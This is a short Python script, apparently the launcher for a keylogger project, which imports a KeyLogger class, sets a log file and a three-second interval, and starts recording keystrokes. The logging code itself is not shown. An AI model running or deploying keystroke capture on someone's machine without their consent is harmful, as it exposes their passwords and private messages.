from key_logger import KeyLogger

FILENAME='test.txt'
SECONDS_PER_LOG = 3

kl = KeyLogger(filename=FILENAME, seconds_per_log=SECONDS_PER_LOG)
kl.start_listener()
